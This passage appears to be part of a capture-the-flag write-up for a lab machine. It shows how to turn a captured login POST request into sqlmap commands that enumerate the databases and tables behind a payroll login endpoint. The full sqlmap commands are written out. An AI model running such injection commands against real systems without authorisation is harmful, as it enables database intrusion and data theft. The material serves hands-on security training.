- Copy POST request in network tab browser as `curl`  command, change `curl` to `sqlmap` or save request from burp to file, and 

- List the DB, add command `-dbs` to the end

```bash
sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=oa30hhodtgive7cv1v5ogdvli5' --data-raw 'username=admin&password=admin' -dbs
```

- After have DB, we tried to fetch the tables
```bash
 sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=oa30hhodtgive7cv1v5ogdvli5' --data-raw 'username=admin&password=admin' -D payroll_db --tables
```

